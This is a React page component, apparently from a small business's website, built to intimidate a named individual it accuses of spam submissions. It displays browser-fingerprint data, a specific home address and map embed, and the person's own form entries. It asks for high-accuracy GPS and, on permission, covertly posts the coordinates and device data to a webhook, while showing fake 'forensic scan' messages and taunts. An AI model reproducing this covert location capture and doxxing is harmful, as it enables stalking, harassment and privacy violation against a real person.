import React, { useEffect, useState } from 'react';

interface ForensicData {
  ip: string;
  fingerprint: string;
  screenResolution: string;
  colorDepth: number;
  pixelRatio: number;
  timezone: string;
  timezoneOffset: number;
  language: string;
  platform: string;
  hardwareConcurrency: number;
  deviceMemory: number | undefined;
  touchPoints: number;
  webglVendor: string | null;
  webglRenderer: string | null;
  canvasHash: string;
  timestamp: string;
  batteryLevel: number | null;
  batteryCharging: boolean | null;
  connectionType: string | null;
  downlinkSpeed: number | null;
  doNotTrack: string | null;
  cookiesEnabled: boolean;
  localIP: string | null;
  historyLength: number;
  referrer: string;
  incognito: boolean | null;
}

interface SubmissionData {
  fullName: string;
  email: string;
  phone: string;
  location: string;
  vehicleType: string;
  service: string;
  description: string;
}

const NiceTryJeffrey: React.FC = () => {
  const [forensics, setForensics] = useState<ForensicData | null>(null);
  const [submission, setSubmission] = useState<SubmissionData | null>(null);
  const [visitCount, setVisitCount] = useState(1);
  const [liveLocation, setLiveLocation] = useState<{ lat: number; lng: number } | null>(null);
  const [locationDenied, setLocationDenied] = useState(false);
  const [timeOnPage, setTimeOnPage] = useState(0);
  const [scanningText, setScanningText] = useState('');
  const [reportId] = useState(() => 'LX-' + Math.random().toString(36).substring(2, 8).toUpperCase() + '-2026');

  useEffect(() => {
    // Read forensics from sessionStorage
    const stored = sessionStorage.getItem('forensics');
    if (stored) {
      try {
        setForensics(JSON.parse(stored));
      } catch (e) {
        console.error('Failed to parse forensics:', e);
      }
    }

    // Read his form submission data
    const submissionStored = sessionStorage.getItem('submissionData');
    if (submissionStored) {
      try {
        setSubmission(JSON.parse(submissionStored));
      } catch (e) {
        console.error('Failed to parse submission:', e);
      }
    }

    // Track how many times he's visited this page
    const count = parseInt(localStorage.getItem('jeffreyVisits') || '0') + 1;
    localStorage.setItem('jeffreyVisits', count.toString());
    setVisitCount(count);

    // Try to get live GPS location (requires permission) - ONLY ONCE
    const gpsAlreadySent = sessionStorage.getItem('gpsSent');
    if (navigator.geolocation && !gpsAlreadySent) {
      navigator.geolocation.getCurrentPosition(
        async (position) => {
          // Check again in case of race condition
          if (sessionStorage.getItem('gpsSent')) return;
          sessionStorage.setItem('gpsSent', 'true');

          const coords = {
            lat: position.coords.latitude,
            lng: position.coords.longitude
          };
          setLiveLocation(coords);

          // 🚨 SEND GPS TO WEBHOOK - HE CLICKED ALLOW!
          try {
            const storedForensics = sessionStorage.getItem('forensics');
            const forensicsData = storedForensics ? JSON.parse(storedForensics) : {};

            await fetch('https://us-central1-mikahs-auto-detailing-crm.cloudfunctions.net/madWebsiteForm', {
              method: 'POST',
              headers: { 'Content-Type': 'application/json' },
              body: JSON.stringify({
                type: '🚨 GPS_LOCATION_CAPTURED',
                latitude: coords.lat,
                longitude: coords.lng,
                accuracy: position.coords.accuracy,
                googleMapsLink: `https://www.google.com/maps?q=${coords.lat},${coords.lng}`,
                timestamp: new Date().toISOString(),
                forensics: forensicsData,
                message: 'JEFFREY ALLOWED GPS ACCESS - EXACT LOCATION CAPTURED'
              })
            });
            console.log('🎯 GPS SENT TO WEBHOOK:', coords);
          } catch (err) {
            console.error('Failed to send GPS to webhook:', err);
          }
        },
        (error) => {
          console.log('Location denied or unavailable:', error.message);
          setLocationDenied(true);
        },
        { enableHighAccuracy: true, timeout: 10000 }
      );
    }

    // Time on page counter
    const timer = setInterval(() => {
      setTimeOnPage(prev => prev + 1);
    }, 1000);

    // Fake scanning animation
    const scanMessages = [
      'Initializing forensic scan...',
      'Extracting device identifiers...',
      'Cross-referencing IP database...',
      'Matching fingerprint to known devices...',
      'Generating evidence report...',
      'Uploading to Lexington County database...',
      'Scan complete. All data captured.'
    ];

    let scanIndex = 0;
    setScanningText(scanMessages[0]);
    const scanTimer = setInterval(() => {
      scanIndex++;
      if (scanIndex < scanMessages.length) {
        setScanningText(scanMessages[scanIndex]);
      } else {
        clearInterval(scanTimer);
      }
    }, 2000);

    return () => {
      clearInterval(timer);
      clearInterval(scanTimer);
    };
  }, []);

  const getBatteryTaunt = () => {
    if (!forensics || forensics.batteryLevel === null || forensics.batteryLevel === undefined) return null;
    if (forensics.batteryLevel < 20) {
      return "Your phone's about to die btw. Maybe charge it before your next harassment attempt.";
    } else if (forensics.batteryLevel < 50) {
      return "Phone's at " + forensics.batteryLevel + "%. Might want to plug in.";
    }
    return null;
  };

  const getIncognitoTaunt = () => {
    if (forensics?.incognito) {
      return "Incognito mode doesn't hide you from us. Nice try though.";
    }
    return null;
  };

  const getConnectionTaunt = () => {
    if (forensics?.connectionType === '4g' || forensics?.connectionType === '5g') {
      return "Using mobile data? Verizon logs everything.";
    }
    return null;
  };

  return (
    <div className="min-h-screen bg-[#0a0a0a] flex items-center justify-center p-4">
      <div className="max-w-2xl w-full bg-[#111] border border-[#333] rounded-lg p-8 md:p-12 font-mono">
        {/* Scanning animation at top */}
        <div className="bg-black border border-green-900 rounded p-3 mb-6 font-mono">
          <div className="flex items-center gap-2 mb-2">
            <div className="w-2 h-2 bg-green-500 rounded-full animate-pulse"></div>
            <span className="text-green-500 text-xs uppercase tracking-wider">Live Scan Active</span>
            <span className="text-gray-600 text-xs ml-auto">Report ID: {reportId}</span>
          </div>
          <p className="text-green-400 text-sm">&gt; {scanningText}</p>
          <div className="mt-2 h-1 bg-green-900 rounded overflow-hidden">
            <div
              className="h-full bg-green-500 transition-all duration-1000"
              style={{ width: `${Math.min(timeOnPage * 7, 100)}%` }}
            ></div>
          </div>
        </div>

        <h1 className="text-4xl md:text-5xl font-bold text-red-500 mb-6">
          Hey Jeffrey.
        </h1>

        {/* Time on page */}
        <p className="text-gray-500 text-xs mb-4">
          ⏱️ You've been staring at this page for {timeOnPage} seconds.
        </p>

        {visitCount > 1 && (
          <p className="text-orange-400 text-sm mb-4">
            This is visit #{visitCount} to this page. Still haven't learned?
          </p>
        )}

        <p className="text-gray-300 text-lg mb-6">
          Your IP and Verizon plan pointing toward <span className="text-white font-bold">430 Sterling Rd, Lexington, SC 29072</span> has been recorded.
        </p>

        <p className="text-gray-300 text-lg mb-6">
          Thank you.
        </p>

        {/* Taunts based on data */}
        <div className="space-y-2 mb-6">
          {getIncognitoTaunt() && (
            <p className="text-purple-400 text-sm">{getIncognitoTaunt()}</p>
          )}
          {getBatteryTaunt() && (
            <p className="text-yellow-400 text-sm">{getBatteryTaunt()}</p>
          )}
          {getConnectionTaunt() && (
            <p className="text-cyan-400 text-sm">{getConnectionTaunt()}</p>
          )}
        </div>

        {/* Dynamic Forensics Data */}
        <div className="bg-[#001a00] border border-[#003300] rounded-lg p-4 mb-6">
          <p className="text-green-500 font-bold mb-3 text-sm uppercase tracking-wider">Your Device Forensics</p>
          <div className="text-green-400 text-sm md:text-base space-y-2">
            <div className="grid grid-cols-1 gap-2">
              <p>
                <span className="text-gray-500">Public IP:</span>{' '}
                <span className="text-green-300">{forensics?.ip || 'Loading...'}</span>
              </p>
              {forensics?.localIP && (
                <p>
                  <span className="text-gray-500">Local Network IP:</span>{' '}
                  <span className="text-red-400">{forensics.localIP}</span>
                  <span className="text-gray-600 text-xs ml-2">(yes, we can see that too)</span>
                </p>
              )}
              <p>
                <span className="text-gray-500">Device Fingerprint:</span>{' '}
                <span className="text-yellow-400 font-bold">{forensics?.fingerprint || 'Loading...'}</span>
              </p>
              <p>
                <span className="text-gray-500">Address:</span>{' '}
                <span className="text-white">430 Sterling Rd, Lexington, SC 29072</span>
              </p>

              {/* Google Maps Embed - Live GPS or fallback to registered address */}
              {liveLocation ? (
                <>
                  <div className="mt-3 rounded overflow-hidden border-2 border-red-500 animate-pulse">
                    <iframe
                      src={`https://maps.google.com/maps?q=${liveLocation.lat},${liveLocation.lng}&t=k&z=20&ie=UTF8&iwloc=&output=embed`}
                      width="100%"
                      height="200"
                      style={{ border: 0 }}
                      allowFullScreen={false}
                      loading="lazy"
                      title="Live Location"
                    ></iframe>
                  </div>
                  <p className="text-red-500 text-xs mt-1 text-center font-bold">
                    🔴 LIVE GPS LOCATION: {liveLocation.lat.toFixed(6)}, {liveLocation.lng.toFixed(6)}
                  </p>
                  <p className="text-red-400 text-xs text-center">You allowed location access. Thanks for that.</p>
                </>
              ) : (
                <>
                  <div className="mt-3 rounded overflow-hidden border border-red-900">
                    <iframe
                      src="https://maps.google.com/maps?q=430+Sterling+Rd,+Lexington,+SC+29072&t=k&z=19&ie=UTF8&iwloc=&output=embed"
                      width="100%"
                      height="200"
                      style={{ border: 0 }}
                      allowFullScreen={false}
                      loading="lazy"
                      title="Location"
                    ></iframe>
                  </div>
                  <p className="text-red-400 text-xs mt-1 text-center">📍 Registered address (IP-based)</p>
                  {locationDenied && (
                    <p className="text-gray-500 text-xs text-center">Smart move denying location. Doesn't matter - we have your IP.</p>
                  )}
                </>
              )}
              <p>
                <span className="text-gray-500">Carrier:</span>{' '}
                <span className="text-green-300">Verizon Wireless</span>
              </p>
            </div>

            <div className="border-t border-[#003300] my-3 pt-3">
              <p className="text-green-500 font-bold mb-2 text-xs uppercase tracking-wider">Device Info</p>
              <div className="grid grid-cols-2 gap-2 text-sm">
                <p>
                  <span className="text-gray-500">Platform:</span>{' '}
                  <span className="text-green-300">{forensics?.platform || '-'}</span>
                </p>
                <p>
                  <span className="text-gray-500">Screen:</span>{' '}
                  <span className="text-green-300">{forensics?.screenResolution || '-'}</span>
                </p>
                <p>
                  <span className="text-gray-500">Pixel Ratio:</span>{' '}
                  <span className="text-green-300">{forensics?.pixelRatio || '-'}x</span>
                </p>
                <p>
                  <span className="text-gray-500">Color Depth:</span>{' '}
                  <span className="text-green-300">{forensics?.colorDepth || '-'}-bit</span>
                </p>
                <p>
                  <span className="text-gray-500">Touch Points:</span>{' '}
                  <span className="text-green-300">{forensics?.touchPoints || '-'}</span>
                </p>
                <p>
                  <span className="text-gray-500">Device Memory:</span>{' '}
                  <span className="text-green-300">{forensics?.deviceMemory ? `${forensics.deviceMemory}GB` : '-'}</span>
                </p>
                <p>
                  <span className="text-gray-500">CPU Cores:</span>{' '}
                  <span className="text-green-300">{forensics?.hardwareConcurrency || '-'}</span>
                </p>
                <p>
                  <span className="text-gray-500">Language:</span>{' '}
                  <span className="text-green-300">{forensics?.language || '-'}</span>
                </p>
              </div>
            </div>

            <div className="border-t border-[#003300] my-3 pt-3">
              <p className="text-green-500 font-bold mb-2 text-xs uppercase tracking-wider">Battery & Connection</p>
              <div className="grid grid-cols-2 gap-2 text-sm">
                <p>
                  <span className="text-gray-500">Battery:</span>{' '}
                  <span className={`${forensics?.batteryLevel != null && forensics.batteryLevel < 20 ? 'text-red-400' : 'text-green-300'}`}>
                    {forensics?.batteryLevel != null ? `${forensics.batteryLevel}%` : '-'}
                    {forensics?.batteryCharging && ' ⚡'}
                  </span>
                </p>
                <p>
                  <span className="text-gray-500">Connection:</span>{' '}
                  <span className="text-green-300">{forensics?.connectionType?.toUpperCase() || '-'}</span>
                </p>
                <p>
                  <span className="text-gray-500">Speed:</span>{' '}
                  <span className="text-green-300">{forensics?.downlinkSpeed ? `${forensics.downlinkSpeed} Mbps` : '-'}</span>
                </p>
                <p>
                  <span className="text-gray-500">Incognito:</span>{' '}
                  <span className={forensics?.incognito ? 'text-red-400' : 'text-green-300'}>
                    {forensics?.incognito === null ? '-' : forensics?.incognito ? 'Yes (lol)' : 'No'}
                  </span>
                </p>
              </div>
            </div>

            <div className="border-t border-[#003300] my-3 pt-3">
              <p className="text-green-500 font-bold mb-2 text-xs uppercase tracking-wider">Location & Time</p>
              <div className="grid grid-cols-1 gap-2 text-sm">
                <p>
                  <span className="text-gray-500">Timezone:</span>{' '}
                  <span className="text-green-300">{forensics?.timezone || '-'}</span>
                </p>
                <p>
                  <span className="text-gray-500">UTC Offset:</span>{' '}
                  <span className="text-green-300">{forensics?.timezoneOffset ? `${-forensics.timezoneOffset / 60} hours` : '-'}</span>
                </p>
                <p>
                  <span className="text-gray-500">Timestamp:</span>{' '}
                  <span className="text-green-300">{forensics?.timestamp ? new Date(forensics.timestamp).toLocaleString() : '-'}</span>
                </p>
              </div>
            </div>

            <div className="border-t border-[#003300] my-3 pt-3">
              <p className="text-green-500 font-bold mb-2 text-xs uppercase tracking-wider">Browser Behavior</p>
              <div className="grid grid-cols-2 gap-2 text-sm">
                <p>
                  <span className="text-gray-500">Do Not Track:</span>{' '}
                  <span className="text-green-300">{forensics?.doNotTrack || 'Off'}</span>
                  {forensics?.doNotTrack === '1' && <span className="text-gray-600 text-xs ml-1">(we don't care)</span>}
                </p>
                <p>
                  <span className="text-gray-500">Cookies:</span>{' '}
                  <span className="text-green-300">{forensics?.cookiesEnabled ? 'Enabled' : 'Disabled'}</span>
                </p>
                <p>
                  <span className="text-gray-500">History Length:</span>{' '}
                  <span className="text-green-300">{forensics?.historyLength || '-'} pages</span>
                </p>
                <p>
                  <span className="text-gray-500">Came From:</span>{' '}
                  <span className="text-green-300 text-xs break-all">{forensics?.referrer || 'direct'}</span>
                </p>
              </div>
            </div>

            <div className="border-t border-[#003300] my-3 pt-3">
              <p className="text-green-500 font-bold mb-2 text-xs uppercase tracking-wider">Graphics & Rendering</p>
              <div className="grid grid-cols-1 gap-2 text-sm">
                <p>
                  <span className="text-gray-500">WebGL Vendor:</span>{' '}
                  <span className="text-green-300">{forensics?.webglVendor || '-'}</span>
                </p>
                <p>
                  <span className="text-gray-500">WebGL Renderer:</span>{' '}
                  <span className="text-green-300">{forensics?.webglRenderer || '-'}</span>
                </p>
                <p>
                  <span className="text-gray-500">Canvas Hash:</span>{' '}
                  <span className="text-green-300 break-all text-xs">{forensics?.canvasHash || '-'}</span>
                </p>
              </div>
            </div>
          </div>
        </div>

        <p className="text-gray-400 mb-6">
          This is the same device from all 7 spam submissions on February 7th, 2026.
        </p>

        {/* His fake submission data thrown back at him */}
        <div className="bg-[#1a0a0a] border border-red-900 rounded-lg p-4 mb-6">
          <p className="text-red-500 font-bold mb-3 text-sm uppercase tracking-wider">Your Submission Data</p>

          {submission ? (
            <div className="space-y-3">
              <div>
                <p className="text-gray-500 text-xs">Name you used:</p>
                <p className="text-red-400 text-lg font-bold">"{submission.fullName}"</p>
              </div>
              <div>
                <p className="text-gray-500 text-xs">Email you used:</p>
                <p className="text-red-400">{submission.email}</p>
              </div>
              <div>
                <p className="text-gray-500 text-xs">Phone you used:</p>
                <p className="text-red-400">{submission.phone}</p>
              </div>
              <div>
                <p className="text-gray-500 text-xs">Location field:</p>
                <p className="text-red-400 text-sm break-all">{submission.location}</p>
              </div>
              {submission.vehicleType && (
                <div>
                  <p className="text-gray-500 text-xs">Vehicle:</p>
                  <p className="text-red-400">{submission.vehicleType}</p>
                </div>
              )}
              {submission.service && (
                <div>
                  <p className="text-gray-500 text-xs">Service selected:</p>
                  <p className="text-red-400">{submission.service}</p>
                </div>
              )}
              {submission.description && (
                <div>
                  <p className="text-gray-500 text-xs">Description:</p>
                  <p className="text-red-400">{submission.description}</p>
                </div>
              )}
              <p className="text-gray-600 text-xs mt-3 pt-3 border-t border-red-900">All of this was logged and sent to our records.</p>
            </div>
          ) : (
            <p className="text-gray-500 text-sm">Loading submission data...</p>
          )}
        </div>

        <div className="bg-[#1a1a1a] rounded-lg p-4 mb-8">
          <p className="text-gray-500 text-sm mb-2">Submission Timeline:</p>
          <ul className="text-gray-400 text-sm space-y-1">
            <li>• 6:40:57 AM EST - Submission 1</li>
            <li>• 6:41:07 AM EST - Submission 2</li>
            <li>• 6:41:09 AM EST - Submissions 3, 4</li>
            <li>• 6:41:10 AM EST - Submissions 5, 6, 7</li>
            <li className="text-yellow-500 font-semibold">• Now - Submission #{7 + visitCount}</li>
          </ul>
        </div>

        {/* Device identification */}
        <div className="bg-[#0a0a1a] border border-blue-900 rounded-lg p-4 mb-6">
          <p className="text-blue-500 font-bold mb-2 text-sm uppercase tracking-wider">Device Identified</p>
          <p className="text-blue-300">
            {forensics?.touchPoints && forensics.touchPoints > 0 ? '📱 iPhone' : '💻 Computer'}
            {forensics?.screenResolution === '393x852' && ' 14 Pro'}
            {forensics?.screenResolution === '430x932' && ' 14 Pro Max / 15 Pro Max'}
            {forensics?.screenResolution === '390x844' && ' 12/13/14'}
          </p>
          <p className="text-gray-500 text-xs mt-1">Screen: {forensics?.screenResolution || '-'} @ {forensics?.pixelRatio || '-'}x</p>
        </div>

        <div className="border-t border-[#333] pt-6">
          <p className="text-yellow-500 text-sm md:text-base">
            All submissions from this device have been logged and forwarded to the
            Lexington County Sheriff's Office as evidence of ongoing harassment.
          </p>
        </div>

        <div className="mt-8 text-center space-y-2">
          <p className="text-gray-600 text-xs">
            Restraining order violations are taken seriously.
          </p>
          <p className="text-gray-500 text-xs">
            btw get a better vpn.
          </p>
          <p className="text-gray-600 text-xs mt-4">
            Every visit to this page is also logged. You've been here {visitCount} time{visitCount > 1 ? 's' : ''}.
          </p>
        </div>
      </div>
    </div>
  );
};

export default NiceTryJeffrey;
